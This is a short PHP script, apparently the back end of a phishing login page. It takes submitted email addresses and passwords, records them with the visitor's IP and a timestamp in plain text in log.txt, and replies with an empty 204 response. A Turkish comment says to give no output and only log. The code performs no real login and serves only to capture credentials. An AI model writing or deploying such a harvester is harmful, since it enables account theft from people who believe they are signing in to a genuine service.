<?php
date_default_timezone_set("Europe/Istanbul");

if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $email = $_POST["email"] ?? 'YOK';
    $password = $_POST["password"] ?? 'YOK';

    $ip = $_SERVER["REMOTE_ADDR"];
    $zaman = date("Y-m-d H:i:s");

    $log = "GİRİŞ - IP: $ip - Zaman: $zaman - E-Posta: $email - Şifre: $password\n";
    file_put_contents("log.txt", $log, FILE_APPEND | LOCK_EX);

    // Hiçbir çıktı verme, sadece logla ve bitir
    http_response_code(204); // 204: No Content (başarı ama çıktı yok)
    exit;
}
